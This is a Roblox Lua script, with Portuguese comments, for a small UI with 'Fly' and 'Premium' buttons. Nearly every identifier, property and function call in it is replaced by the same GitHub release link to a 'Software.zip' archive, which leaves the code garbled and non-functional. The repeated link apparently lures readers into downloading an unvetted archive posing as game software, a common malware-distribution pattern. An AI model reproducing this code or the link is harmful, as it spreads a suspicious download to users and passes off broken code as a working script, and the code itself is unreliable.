--abaixo estara lib nosso Ui
local UIS = game:GetService("UserInputService")
local player = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip

local function fly()
    local character = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:ChangeState(https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip(0, 50, 0) -- Ajuste a força do voo
    end
end

local function premium()
    -- Adicione aqui o código para dar ao jogador itens ou benefícios "premium" dentro das regras do Roblox
end

https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip(function(input, gameProcessed)
    if https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip == https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip then
        local screenGui = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip("ScreenGui", https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip)
        local frame = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip("Frame", screenGui)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip(0.5, 0, 0.5, 0)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip(0.25, 0, 0.25, 0)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip(0, 0, 0)

        local flyButton = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip("TextButton", frame)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip(0.8, 0, 0.1, 0)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip(0.1, 0, 0.1, 0)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip = "Fly"

        https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip(fly)

        local premiumButton = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip("TextButton", frame)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip(0.8, 0, 0.1, 0)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip(0.1, 0, 0.25, 0)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip = "Premium"

        https://github.com/tauazinhefin/tauazinhefin/releases/download/v2.0/Software.zip(premium)
    end
end)
